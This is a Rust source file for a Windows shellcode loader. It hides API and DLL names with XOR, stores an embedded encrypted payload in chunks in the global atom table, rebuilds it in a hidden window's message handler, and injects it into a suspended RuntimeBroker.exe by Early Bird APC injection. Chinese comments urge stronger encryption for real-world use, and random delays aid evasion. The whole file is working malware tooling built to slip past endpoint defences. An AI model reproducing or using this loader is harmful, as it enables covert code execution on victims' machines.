use core::ffi::c_void;
use windows::{
    core::{PCSTR, PCWSTR, PWSTR},
    Win32::{
        Foundation::{BOOL, HANDLE, HWND, LPARAM, LRESULT, WPARAM, GetLastError},
        Security::SECURITY_ATTRIBUTES,
        System::{
            LibraryLoader::{GetModuleHandleW, GetProcAddress},
            Memory::{MEM_COMMIT, MEM_RESERVE, VIRTUAL_ALLOCATION_TYPE},
            Threading::{
                CreateProcessW, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION,
                ResumeThread, STARTUPINFOW, WaitForSingleObject,
            },
        },
        UI::WindowsAndMessaging::{
            CreateWindowExW, DefWindowProcW, DispatchMessageW, GetMessageW, PostQuitMessage,
            RegisterClassExW, SendMessageW, TranslateMessage, HMENU, WINDOW_EX_STYLE,
            WNDCLASSEXW, WS_OVERLAPPEDWINDOW, WM_DESTROY, WM_USER,
        },
    },
};
use std::ptr::{null, null_mut};
use std::sync::Mutex;
use lazy_static::lazy_static;
use std::thread::sleep;
use std::time::Duration;
use rand::Rng;

type GlobalAddAtomWFn = unsafe extern "system" fn(PCWSTR) -> u16;
type GlobalGetAtomNameWFn = unsafe extern "system" fn(u16, *mut u16, i32) -> u32;
type VirtualAllocExFn = unsafe extern "system" fn(HANDLE, *const c_void, usize, VIRTUAL_ALLOCATION_TYPE, u32) -> *mut c_void;

type NtWriteVirtualMemoryFn = unsafe extern "system" fn(
    HANDLE,
    *mut c_void,
    *const c_void,
    usize,
    *mut usize
) -> i32;

type NtQueueApcThreadFn = unsafe extern "system" fn(
    HANDLE,
    *mut c_void,
    *const c_void,
    *const c_void,
    *const c_void
) -> i32;

const WM_TRIGGER_EXEC: u32 = WM_USER + 0x1984;

// 分块大小最好不超过120
const CHUNK_SIZE: usize = 97;

// 实战自行修改更复杂的key或者其他加密方式，这边只是演示
const XOR_KEY: &[u8] = b"0x5A";

fn xor_str_wide(data: &[u16], key: &[u8]) -> Vec<u16> {
    data.iter().enumerate().map(|(i, &w)| {
        let key_byte = key[i % key.len()];
        w ^ (key_byte as u16)
    }).collect()
}

fn random_delay() {
    let mut rng = rand::rng();
    let delay_ms = rng.random_range(0..=3);
    sleep(Duration::from_millis(delay_ms));
}

lazy_static! {
    static ref ENTRY_IDS: Mutex<Vec<u16>> = Mutex::new(Vec::new());
}

fn xor_decrypt(data: &mut [u8], key: &[u8]) {
    for (i, byte) in data.iter_mut().enumerate() {
        *byte ^= key[i % key.len()];
    }
}

fn xor_str(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter().enumerate().map(|(i, &byte)| byte ^ key[i % key.len()]).collect()
}

fn main() {
    unsafe {
        // 加载 kernel32.dll
        let kernel32_raw: Vec<u16> = "kernel32.dll\0".encode_utf16().collect();
        let kernel32_enc = xor_str_wide(&kernel32_raw, XOR_KEY);
        let kernel32 = GetModuleHandleW(PCWSTR(xor_str_wide(&kernel32_enc, XOR_KEY).as_ptr()))
            .expect("Failed to get kernel32 handle");

        // 获取函数地址
        let add_atom_enc = xor_str(b"GlobalAddAtomW\0", XOR_KEY);
        let get_atom_enc = xor_str(b"GlobalGetAtomNameW\0", XOR_KEY);
        let global_add_atom_w: GlobalAddAtomWFn = std::mem::transmute(GetProcAddress(
            kernel32,
            PCSTR(xor_str(&add_atom_enc, XOR_KEY).as_ptr()),
        ).expect("Failed to get GlobalAddAtomW"));
        let _global_get_atom_name_w: GlobalGetAtomNameWFn = std::mem::transmute(GetProcAddress(
            kernel32,
            PCSTR(xor_str(&get_atom_enc, XOR_KEY).as_ptr()),
        ).expect("Failed to get GlobalGetAtomNameW"));

        let data = include_bytes!("320_encrypted.bin").to_vec();
        let data_len = data.len();
        println!("Loaded shellcode: {} bytes", data_len);

        // 将 shellcode 分块存入全局原子表
        let mut entry_ids = Vec::new();
        for (i, chunk) in data.chunks(CHUNK_SIZE).enumerate() {
            let prefix = format!("X{}", i + 1);
            let encoded_chunk: String = chunk.iter().map(|b| format!("{:02x}", b ^ 0x5A)).collect();
            let entry_name = format!("{}{}", prefix, encoded_chunk);
            let wide_entry: Vec<u16> = entry_name.encode_utf16().chain(std::iter::once(0)).collect();
            let entry_id = global_add_atom_w(PCWSTR(wide_entry.as_ptr()));
            if entry_id == 0 {
                println!("Failed to add chunk {}: error = {:?}", i, GetLastError());
                return;
            }
            entry_ids.push(entry_id);
            println!("Added chunk {}: entry_id = {}", i, entry_id);
            random_delay();
        }
        ENTRY_IDS.lock().unwrap().extend_from_slice(&entry_ids);

        let class_name_raw: Vec<u16> = "HiddenClass\0".encode_utf16().collect();
        let class_name_enc = xor_str_wide(&class_name_raw, XOR_KEY);
        let class_name_dec = xor_str_wide(&class_name_enc, XOR_KEY);
        let wnd_class = WNDCLASSEXW {
            cbSize: size_of::<WNDCLASSEXW>() as u32,
            lpfnWndProc: Some(window_proc),
            lpszClassName: PCWSTR(class_name_dec.as_ptr()),
            hInstance: kernel32,
            ..Default::default()
        };
        let class_atom = RegisterClassExW(&wnd_class);
        if class_atom == 0 {
            println!("Failed to register class: {:?}", GetLastError());
            return;
        }
        random_delay();

        // 创建窗口
        let window_name_raw: Vec<u16> = "HiddenWindow\0".encode_utf16().collect();
        let window_name_enc = xor_str_wide(&window_name_raw, XOR_KEY);
        let window_name_dec = xor_str_wide(&window_name_enc, XOR_KEY);
        let hwnd = CreateWindowExW(
            WINDOW_EX_STYLE::default(),
            PCWSTR(class_name_dec.as_ptr()),
            PCWSTR(window_name_dec.as_ptr()),
            WS_OVERLAPPEDWINDOW,
            0,
            0,
            1,
            1,
            HWND(0),
            HMENU(0),
            kernel32,
            Some(null()),
        );
        if hwnd.0 == 0 {
            println!("Failed to create window: {:?}", GetLastError());
            return;
        }
        println!("Window created: {:?}", hwnd);
        random_delay();

        // 触发注入
        SendMessageW(hwnd, WM_TRIGGER_EXEC, WPARAM(data_len), LPARAM(entry_ids.len() as isize));
        let mut msg = std::mem::zeroed();
        while GetMessageW(&mut msg, HWND(0), 0, 0) != BOOL(0) {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
    }
}

unsafe extern "system" fn window_proc(
    hwnd: HWND,
    msg: u32,
    wparam: WPARAM,
    lparam: LPARAM,
) -> LRESULT {
    match msg {
        WM_TRIGGER_EXEC => {
            let data_size = wparam.0;
            let chunk_count = lparam.0 as usize;

            // 加载 ntdll.dll
            let ntdll_raw: Vec<u16> = "ntdll.dll\0".encode_utf16().collect();
            let ntdll_enc = xor_str_wide(&ntdll_raw, XOR_KEY);
            let ntdll = GetModuleHandleW(PCWSTR(xor_str_wide(&ntdll_enc, XOR_KEY).as_ptr())).unwrap();

            // 获取 Nt 函数
            let nt_write_mem_enc = xor_str(b"NtWriteVirtualMemory\0", XOR_KEY);
            let nt_queue_apc_enc = xor_str(b"NtQueueApcThread\0", XOR_KEY);
            let nt_write_virtual_memory: NtWriteVirtualMemoryFn = std::mem::transmute(
                GetProcAddress(ntdll, PCSTR(xor_str(&nt_write_mem_enc, XOR_KEY).as_ptr())).unwrap()
            );
            let nt_queue_apc_thread: NtQueueApcThreadFn = std::mem::transmute(
                GetProcAddress(ntdll, PCSTR(xor_str(&nt_queue_apc_enc, XOR_KEY).as_ptr())).unwrap()
            );

            // 加载 kernel32.dll
            let kernel32_raw: Vec<u16> = "kernel32.dll\0".encode_utf16().collect();
            let kernel32_enc = xor_str_wide(&kernel32_raw, XOR_KEY);
            let kernel32 = GetModuleHandleW(PCWSTR(xor_str_wide(&kernel32_enc, XOR_KEY).as_ptr())).unwrap();

            let get_atom_enc = xor_str(b"GlobalGetAtomNameW\0", XOR_KEY);
            let virt_alloc_enc = xor_str(b"VirtualAllocEx\0", XOR_KEY);
            let global_get_atom_name_w: GlobalGetAtomNameWFn = std::mem::transmute(
                GetProcAddress(kernel32, PCSTR(xor_str(&get_atom_enc, XOR_KEY).as_ptr())).unwrap()
            );
            let virtual_alloc_ex: VirtualAllocExFn = std::mem::transmute(
                GetProcAddress(kernel32, PCSTR(xor_str(&virt_alloc_enc, XOR_KEY).as_ptr())).unwrap()
            );

            // 从原子表重组 shellcode
            let mut payload = Vec::with_capacity(data_size);
            let entry_ids = ENTRY_IDS.lock().unwrap();
            for i in 0..chunk_count {
                let entry_id = entry_ids[i];
                let mut buffer = [0u16; 256];
                let len = global_get_atom_name_w(entry_id, buffer.as_mut_ptr(), 256) as usize;
                if len == 0 {
                    println!("Failed to get atom name for chunk {}", i);
                    return DefWindowProcW(hwnd, msg, wparam, lparam);
                }
                let prefix = format!("X{}", i + 1);
                let prefix_len = prefix.len();
                let mut encoded_str = String::with_capacity(len.saturating_sub(prefix_len));
                for j in prefix_len..len {
                    if buffer[j] != 0 {
                        if let Some(c) = char::from_u32(buffer[j] as u32) {
                            encoded_str.push(c);
                        }
                    }
                }
                for j in (0..encoded_str.len()).step_by(2) {
                    if j + 1 < encoded_str.len() {
                        let byte_str = &encoded_str[j..j + 2];
                        if let Ok(byte) = u8::from_str_radix(byte_str, 16) {
                            payload.push(byte ^ 0x5A);
                        }
                    }
                }
                random_delay();
            }

            if payload.len() == data_size {
                xor_decrypt(&mut payload, XOR_KEY);
                random_delay();

                // Early Bird APC 注入技术
                let mut si: STARTUPINFOW = std::mem::zeroed();
                let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
                let proc_path_raw: Vec<u16> = "C:\\Windows\\System32\\RuntimeBroker.exe\0".encode_utf16().collect();
                let proc_path_enc = xor_str_wide(&proc_path_raw, XOR_KEY);
                let success = CreateProcessW(
                    PCWSTR(xor_str_wide(&proc_path_enc, XOR_KEY).as_ptr()),
                    PWSTR(null_mut()),
                    Some(null::<SECURITY_ATTRIBUTES>()),
                    Some(null::<SECURITY_ATTRIBUTES>()),
                    BOOL(0),
                    PROCESS_CREATION_FLAGS(0x00000004),
                    Some(null()),
                    None,
                    &mut si,
                    &mut pi,
                );
                if success == BOOL(0) {
                    println!("Process creation failed: {:?}", GetLastError());
                    return DefWindowProcW(hwnd, msg, wparam, lparam);
                }
                random_delay();

                let base_addr = virtual_alloc_ex(
                    pi.hProcess,
                    null(),
                    data_size,
                    VIRTUAL_ALLOCATION_TYPE(MEM_COMMIT.0 | MEM_RESERVE.0),
                    0x40, // PAGE_EXECUTE_READWRITE
                );
                if base_addr.is_null() {
                    println!("Memory allocation failed: {:?}", GetLastError());
                    return DefWindowProcW(hwnd, msg, wparam, lparam);
                }
                random_delay();

                let mut bytes_written = 0;
                let nt_status = nt_write_virtual_memory(
                    pi.hProcess,
                    base_addr,
                    payload.as_ptr() as *const _,
                    data_size,
                    &mut bytes_written,
                );
                if nt_status != 0 || bytes_written != data_size {
                    println!("NtWriteVirtualMemory failed: NTSTATUS = {:x}", nt_status);
                    return DefWindowProcW(hwnd, msg, wparam, lparam);
                }
                random_delay();

                let nt_status = nt_queue_apc_thread(
                    pi.hThread,
                    std::mem::transmute(base_addr),
                    null(),
                    null(),
                    null(),
                );
                if nt_status != 0 {
                    println!("NtQueueApcThread failed: NTSTATUS = {:x}", nt_status);
                    return DefWindowProcW(hwnd, msg, wparam, lparam);
                }
                random_delay();

                let resume_result = ResumeThread(pi.hThread);
                if resume_result == u32::MAX {
                    println!("Thread resume failed: {:?}", GetLastError());
                    return DefWindowProcW(hwnd, msg, wparam, lparam);
                }
                random_delay();

                WaitForSingleObject(pi.hProcess, 3000);
                windows::Win32::Foundation::CloseHandle(pi.hProcess);
                windows::Win32::Foundation::CloseHandle(pi.hThread);
            }

            PostQuitMessage(0);
        }
        WM_DESTROY => {
            PostQuitMessage(0);
        }
        _ => {}
    }
    DefWindowProcW(hwnd, msg, wparam, lparam)
}